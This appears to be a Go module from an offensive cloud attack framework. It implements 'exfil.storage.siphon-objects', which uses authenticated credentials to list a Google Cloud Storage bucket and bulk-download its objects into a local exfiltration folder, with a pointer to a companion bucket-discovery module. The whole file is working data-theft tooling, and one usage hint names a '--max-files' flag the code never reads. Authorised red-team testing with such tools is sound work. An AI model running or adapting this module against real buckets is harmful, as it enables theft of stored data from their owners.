package storage

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	gcs "cloud.google.com/go/storage"
	"google.golang.org/api/iterator"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&SiphonObjects{})
}

// SiphonObjects downloads objects from a Cloud Storage bucket.
type SiphonObjects struct{}

func (m *SiphonObjects) Info() module.Info {
	return module.Info{
		Name:         "exfil.storage.siphon-objects",
		Tactic:       module.TacticExfil,
		Service:      "storage",
		Description:  "Download objects from a Cloud Storage bucket for exfiltration",
		RequiresAuth: true,
		AttackID:     "T1530",
	}
}

func (m *SiphonObjects) Run(ctx module.RunContext) error {
	bucket := ctx.Flags["bucket"]
	prefix := ctx.Flags["prefix"]
	outputDir := ctx.Flags["output"]
	maxFiles := 100

	if bucket == "" {
		output.Warn("Usage: run exfil.storage.siphon-objects --bucket <name> [--prefix <path/>] [--output <dir>]")
		output.Info("Tip: run 'recon.storage.probe-buckets' first to discover buckets.")
		return nil
	}

	if outputDir == "" {
		outputDir = filepath.Join(".", "exfil", bucket)
	}
	os.MkdirAll(outputDir, 0o755)

	client, err := gcs.NewClient(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create storage client: %w", err)
	}
	defer client.Close()

	output.Info("Downloading objects from gs://%s/%s", bucket, prefix)

	query := &gcs.Query{Prefix: prefix}
	it := client.Bucket(bucket).Objects(context.Background(), query)

	downloaded := 0
	totalBytes := int64(0)

	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			output.Error("List objects: %v", err)
			break
		}

		if downloaded >= maxFiles {
			output.Warn("Reached max file limit (%d). Use --max-files to increase.", maxFiles)
			break
		}

		// Skip directories.
		if strings.HasSuffix(attrs.Name, "/") {
			continue
		}

		// Create local directory structure.
		localPath := filepath.Join(outputDir, attrs.Name)
		os.MkdirAll(filepath.Dir(localPath), 0o755)

		rc, err := client.Bucket(bucket).Object(attrs.Name).NewReader(context.Background())
		if err != nil {
			output.Error("Read %s: %v", attrs.Name, err)
			continue
		}

		f, err := os.Create(localPath)
		if err != nil {
			rc.Close()
			output.Error("Create %s: %v", localPath, err)
			continue
		}

		n, err := io.Copy(f, rc)
		f.Close()
		rc.Close()

		if err != nil {
			output.Error("Download %s: %v", attrs.Name, err)
			continue
		}

		downloaded++
		totalBytes += n
		if ctx.Verbose {
			output.Info("  %s (%d bytes)", attrs.Name, n)
		}
	}

	output.Success("Downloaded %d files (%d bytes) to %s", downloaded, totalBytes, outputDir)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "exfil.storage.siphon-objects",
			Severity:    module.SevHigh,
			Title:       "Bucket objects exfiltrated",
			Description: fmt.Sprintf("Downloaded %d files from gs://%s to %s", downloaded, bucket, outputDir),
			Resource:    bucket,
		}
	}

	return nil
}
